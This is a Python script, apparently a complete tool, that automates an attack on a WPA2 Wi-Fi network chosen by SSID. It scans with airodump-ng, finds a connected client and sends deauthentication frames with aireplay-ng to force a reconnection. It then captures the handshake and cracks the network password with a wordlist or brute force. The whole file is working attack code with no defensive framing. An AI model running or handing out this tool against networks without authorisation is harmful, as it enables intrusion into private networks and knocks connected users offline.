#!/usr/bin/env python3
import os
import sys
import time
import glob
import shutil
import tempfile
import subprocess
import argparse
from extract_handshake import extract_handshake_info
from wpa_cracker import crack_password_wordlist, crack_with_bruteforce

def run_airodump_scan(iface, scan_dir, duration=10):
    print("[*] Scanning for access points...")
    out_prefix = os.path.join(scan_dir, "scan")
    proc = subprocess.Popen(["airodump-ng", "-w", out_prefix, "--output-format", "csv", iface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    proc.wait()

    # Find latest scan CSV
    csv_files = glob.glob(f"{out_prefix}-*.csv")
    if not csv_files:
        raise RuntimeError("No scan results found.")
    return sorted(csv_files)[-1]

def parse_ap_from_csv(csv_file, target_ssid):
    with open(csv_file, 'r') as f:
        lines = f.readlines()

    aps_section = True
    for line in lines:
        if line.strip() == "":
            aps_section = False
            continue
        if aps_section and target_ssid in line:
            parts = [x.strip() for x in line.split(',')]
            bssid = parts[0]
            channel = parts[3]
            print(f"[✓] Found AP: BSSID={bssid}, CH={channel}")
            return bssid, channel
    raise ValueError("Target SSID not found.")

def capture_handshake(iface, bssid, channel, temp_dir, duration=30):
    print(f"[*] Capturing handshake from BSSID {bssid} on channel {channel}")
    out_prefix = os.path.join(temp_dir, "handshake")
    proc = subprocess.Popen(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_prefix, iface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    proc.wait()

    # Find resulting .cap file
    cap_files = glob.glob(f"{out_prefix}-*.cap")
    if not cap_files:
        raise RuntimeError("No .cap file found after handshake capture.")
    return sorted(cap_files)[-1]

def send_deauth(iface, bssid, client_mac):
    print(f"[!] Sending deauth to client {client_mac}")
    subprocess.call(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, iface])

def get_connected_client(bssid, iface, temp_dir, duration=10):
    print(f"[*] Looking for connected clients to BSSID {bssid}")
    out_prefix = os.path.join(temp_dir, "client_scan")
    proc = subprocess.Popen(["airodump-ng", "--bssid", bssid, "-w", out_prefix, iface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    proc.wait()

    csv_files = glob.glob(f"{out_prefix}-*.csv")
    if not csv_files:
        raise RuntimeError("No client scan results.")
    
    with open(sorted(csv_files)[-1], 'r') as f:
        lines = f.readlines()

    found = False
    for line in lines:
        if bssid in line:
            found = True
        elif found and line.strip() != "":
            parts = [x.strip() for x in line.split(',')]
            if len(parts) > 0 and ":" in parts[0]:
                print(f"[✓] Found client MAC: {parts[0]}")
                return parts[0]
    raise RuntimeError("No connected client found.")

def main():
    parser = argparse.ArgumentParser(description="Auto WPA2 handshake capture and cracking tool")
    parser.add_argument('--target', required=True, help="Target SSID to attack")
    parser.add_argument('--iface', required=True, help="Monitor mode interface (e.g. wlp1s0mon)")
    parser.add_argument('--passlist', help="Password list for cracking")
    parser.add_argument('--brute', action='store_true', help="Use bruteforce instead of wordlist")
    parser.add_argument('--max_len', type=int, help="Max length for bruteforce password (default=10)")
    args = parser.parse_args()

    temp_dir = tempfile.mkdtemp(prefix="wpa-auto-")
    try:
        csv_file = run_airodump_scan(args.iface, temp_dir)
        bssid, channel = parse_ap_from_csv(csv_file, args.target)
        client_mac = get_connected_client(bssid, args.iface, temp_dir)
        send_deauth(args.iface, bssid, client_mac)
        cap_file = capture_handshake(args.iface, bssid, channel, temp_dir)

        # Now extract handshake fields
        print("[*] Extracting handshake data...")
        ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload = extract_handshake_info(cap_file)

        # Start cracking
        if args.brute:
            max_len = args.max_len if args.max_len else 10
            crack_with_bruteforce(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, max_len=max_len)
        else:
            if not args.passlist:
                print("❌ Must provide --passlist when not using --brute")
                return
            crack_password_wordlist(ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_payload, args.passlist)
    finally:
        print(f"[*] Cleaning up temp dir: {temp_dir}")
        shutil.rmtree(temp_dir)

if __name__ == "__main__":
    main()
